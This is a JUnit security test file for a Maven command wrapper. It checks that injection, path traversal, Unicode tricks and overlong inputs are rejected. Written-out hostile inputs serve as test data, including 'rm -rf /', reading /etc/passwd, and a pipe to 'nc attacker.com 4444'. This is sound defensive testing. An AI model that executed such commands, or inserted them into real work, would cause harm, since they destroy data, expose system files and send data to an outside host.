package com.pragmatik.buildtools;

import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Nested;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;

import java.nio.file.Path;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatIllegalArgumentException;

@DisplayName("Security and adversarial tests")
class MavenSecurityTest {

    private final MavenService service = new MavenService();
    private static final String MAVEN_HOME = "/opt/maven";

    @TempDir
    Path tempDir;

    @Nested
    @DisplayName("Command injection via getCommands() — now blocked by allowlist")
    class CommandInjectionGetCommands {

        @Test
        @DisplayName("shell command chaining with && is rejected")
        void shellChainingWithDoubleAmpersand() {
            assertThatIllegalArgumentException()
                    .isThrownBy(() -> MavenInvoker.getCommands("mvn clean && rm -rf /"))
                    .withMessageContaining("Command not allowed");
        }

        @Test
        @DisplayName("shell command chaining with semicolon is rejected")
        void shellChainingWithSemicolon() {
            assertThatIllegalArgumentException()
                    .isThrownBy(() -> MavenInvoker.getCommands("mvn clean ; cat /etc/passwd"))
                    .withMessageContaining("Command not allowed");
        }

        @Test
        @DisplayName("shell command substitution with backticks is rejected")
        void shellCommandSubstitutionBackticks() {
            assertThatIllegalArgumentException()
                    .isThrownBy(() -> MavenInvoker.getCommands("mvn clean `touch /tmp/pwned`"))
                    .withMessageContaining("Command not allowed");
        }

        @Test
        @DisplayName("shell command substitution with dollar-paren is rejected")
        void shellCommandSubstitutionDollarParen() {
            assertThatIllegalArgumentException()
                    .isThrownBy(() -> MavenInvoker.getCommands("mvn clean $(cat /etc/passwd)"))
                    .withMessageContaining("Command not allowed");
        }

        @Test
        @DisplayName("pipe injection attempt is rejected")
        void pipeInjection() {
            assertThatIllegalArgumentException()
                    .isThrownBy(() -> MavenInvoker.getCommands("mvn clean | nc attacker.com 4444"))
                    .withMessageContaining("Command not allowed");
        }

        @Test
        @DisplayName("exec:exec plugin is blocked")
        void execExecBypass() {
            assertThatIllegalArgumentException()
                    .isThrownBy(() -> MavenInvoker.getCommands("mvn exec:exec -Dexec.executable=/bin/sh"))
                    .withMessageContaining("Blocked plugin goal");
        }

        @Test
        @DisplayName("legitimate commands with safe flags pass allowlist")
        void legitimateCommandsPass() {
            String[] result = MavenInvoker.getCommands("mvn clean install -DskipTests");
            assertThat(result).containsExactly("clean", "install", "-DskipTests");
        }
    }

    @Nested
    @DisplayName("Path traversal via projectDir")
    class PathTraversalProjectDir {

        @Test
        @DisplayName("path traversal with dotdot fails validation")
        void pathTraversalWithDotDot() {
            Path traversal = tempDir.resolve("../nonexistent-dir-xyz");
            try {
                service.executeCommand(MAVEN_HOME, traversal.toString(), "clean");
            } catch (IllegalArgumentException e) {
                assertThat(e.getMessage())
                        .containsAnyOf("does not exist", "Cannot resolve project directory");
            }
        }
    }

    @Nested
    @DisplayName("Unicode and encoding attacks")
    class UnicodeAttacks {

        @Test
        @DisplayName("simple Unicode argument preserved")
        void unicodeArgumentsPreserved() {
            String[] result = MavenInvoker.getCommands("mvn clean -Dname=test");
            assertThat(result).containsExactly("clean", "-Dname=test");
        }

        @Test
        @DisplayName("zero-width characters in command are rejected")
        void zeroWidthCharacters() {
            assertThatIllegalArgumentException()
                    .isThrownBy(() -> MavenInvoker.getCommands("mvn cle\u200Ban\u200B"))
                    .withMessageContaining("Command not allowed");
        }
    }

    @Nested
    @DisplayName("Denial of service via long inputs")
    class LongInputAttacks {

        @Test
        @DisplayName("very long command does not crash (allowed tokens)")
        void veryLongCommand() {
            StringBuilder sb = new StringBuilder("mvn");
            for (int i = 0; i < 10000; i++) {
                sb.append(" clean");
            }
            String[] result = MavenInvoker.getCommands(sb.toString());
            assertThat(result).hasSize(10000);
        }

        @Test
        @DisplayName("extremely long mavenHome path fails validation")
        void extremelyLongMavenHomePath() {
            StringBuilder sb = new StringBuilder(tempDir.toString());
            while (sb.length() < 10000) {
                sb.append("/a");
            }
            try {
                service.executeCommand(sb.toString(), tempDir.toString(), "clean");
            } catch (IllegalArgumentException e) {
                assertThat(e.getMessage())
                        .containsAnyOf("Invalid maven home directory", "Cannot resolve maven home path");
            }
        }
    }

    @Nested
    @DisplayName("Security posture documentation")
    class SecurityPostureDocumentation {

        @Test
        @DisplayName("mavenHome validation blocks nonexistent paths")
        void mavenHomeValidationBlocksNonexistentPaths() {
            try {
                service.executeCommand("/nonexistent/path", tempDir.toString(), "clean");
                throw new AssertionError("Should have thrown");
            } catch (IllegalArgumentException e) {
                assertThat(e.getMessage()).containsAnyOf("Invalid maven home directory", "Cannot resolve");
            }
        }

        @Test
        @DisplayName("projectDir validation blocks nonexistent paths")
        void projectDirValidationBlocksNonexistentPaths() {
            try {
                service.executeCommand(MAVEN_HOME, "/nonexistent/project", "clean");
                throw new AssertionError("Should have thrown");
            } catch (IllegalArgumentException e) {
                assertThat(e.getMessage())
                        .containsAnyOf("does not exist", "Cannot resolve project directory");
            }
        }

        @Test
        @DisplayName("null mavenHome is rejected")
        void nullMavenHomeRejected() {
            try {
                service.executeCommand(null, tempDir.toString(), "clean");
                throw new AssertionError("Should have thrown");
            } catch (IllegalArgumentException e) {
                assertThat(e.getMessage()).contains("cannot be null");
            }
        }

        @Test
        @DisplayName("null projectDir is rejected")
        void nullProjectDirRejected() {
            try {
                service.executeCommand(MAVEN_HOME, null, "clean");
                throw new AssertionError("Should have thrown");
            } catch (IllegalArgumentException e) {
                assertThat(e.getMessage()).contains("cannot be null");
            }
        }

        @Test
        @DisplayName("getCommands now sanitizes and rejects shell metacharacters")
        void getCommandsNowSanitizesShellMetacharacters() {
            assertThatIllegalArgumentException()
                    .isThrownBy(() -> MavenInvoker.getCommands("mvn clean && rm -rf /"))
                    .withMessageContaining("Command not allowed");
        }
    }
}
